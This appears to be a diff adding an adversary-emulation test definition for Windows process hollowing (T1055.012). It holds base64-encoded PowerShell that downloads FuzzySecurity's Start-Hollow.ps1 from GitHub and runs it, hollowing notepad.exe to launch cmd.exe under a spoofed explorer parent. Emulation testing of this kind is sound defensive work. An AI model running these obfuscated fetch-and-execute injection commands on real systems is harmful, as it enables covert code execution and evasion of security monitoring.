@@ -1,0 +1,24 @@
+- id: b1767084-f8e6-55e7-8bb8-c6c178573a44
+  name: Soumaia ART Tests - Process Hollowing using PowerShell
+  description: 'This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.
+
+    Credit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)'
+  tactic: stealth
+  technique:
+    attack_id: T1055.012
+    name: 'Process Injection: Process Hollowing'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFMAdABhAHIAdAAtAEgAbwBsAGwAbwB3AC4AcABzADEAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand dAByAHkAIAB7AAoAIAAgAGkAdwByACAAIgBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAEYAdQB6AHoAeQBTAGUAYwB1AHIAaQB0AHkALwBQAG8AdwBlAHIAUwBoAGUAbABsAC0AUwB1AGkAdABlAC8ANwAyADAAZAA4AGYAZQA4ADIAMwA5ADYAZgBhAGYANwA0AGYAMgBjAGEAMQA5AGEAMwBmAGUAOQA5AGEANQBjADIANgAyAGEAMQA0AGIAOQAvAFMAdABhAHIAdAAtAEgAbwBsAGwAbwB3AC4AcABzADEAIgAgAC0ATwB1AHQARgBpAGwAZQAgACgATgBlAHcALQBJAHQAZQBtACAALQBQAGEAdABoACAALgBcAFMAdABhAHIAdAAtAEgAbwBsAGwAbwB3AC4AcABzADEAIAAtAEYAbwByAGMAZQApAAoAfQAgAGMAYQB0AGMAaAAgAHsACgAgACAAVwByAGkAdABlAC0ARQByAHIAbwByACAAJABfAAoAIAAgAEUAeABpAHQAIAAxAAoAfQAKAA==
+          }
+          . ".\Start-Hollow.ps1"
+          $ppid=Get-Process explorer | select -expand id
+          Start-Hollow -Sponsor "C:\Windows\System32\notepad.exe" -Hollow "C:\Windows\System32\cmd.exe" -ParentPID $ppid -Verbose
+        cleanup: |-
+          Stop-Process -Name "notepad" -ErrorAction Ignore
+        payloads:
+        - Start-Hollow.ps1
